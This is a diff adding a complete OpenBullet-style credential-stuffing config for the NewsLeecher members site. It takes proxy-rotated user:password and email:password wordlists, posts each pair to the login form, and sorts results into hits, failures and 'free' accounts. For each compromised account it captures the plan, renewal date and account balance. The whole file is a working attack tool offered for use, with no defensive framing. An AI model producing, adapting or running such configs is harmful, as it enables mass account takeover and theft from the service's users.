@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "NewsLeecher",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-09T12:33:51.0161475+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 3,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://www.newsleecher.com/members/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "[name=login]" "value" 0 -> VAR "LOGIN" "" "" 
+#POST REQUEST POST "https://www.newsleecher.com/members/" AutoRedirect=TRUE 
+  CONTENT "login=<LOGIN>&login_username=<USER>&login_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.newsleecher.com/members/?logoff=1" 
+  HEADER "Origin: https://www.newsleecher.com" 
+  HEADER "Host: www.newsleecher.com" 
+#KEYS KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Plan Status" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to log into the members area" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Plan is inactive" 
+    KEY "Payment information seems to be expired." 
+#PLAN PARSE "<SOURCE>" CSS "body > div:nth-child(5) > div:nth-child(1) > span > b" "innerHTML" 0 -> CAP "PLAN" "" "" 
+#RENEWAL_DATE PARSE "<SOURCE>" LR "date : " "&nbsp" Recursive=FALSE -> CAP "RENEWAL DATE" "" "" 
+#RENEWAL PARSE "<SOURCE>" LR ">.<br>" "<hr style='margin-bottom: 25" Recursive=FALSE -> CAP "RENEWAL" "" "" 
+#ACCOUNTBALANCE PARSE "<SOURCE>" LR "ce : " "&nbsp;&nbsp;-&nbsp;&nbsp;C" Recursive=FALSE -> CAP "ACCOUNTBALANCE" "" "" 
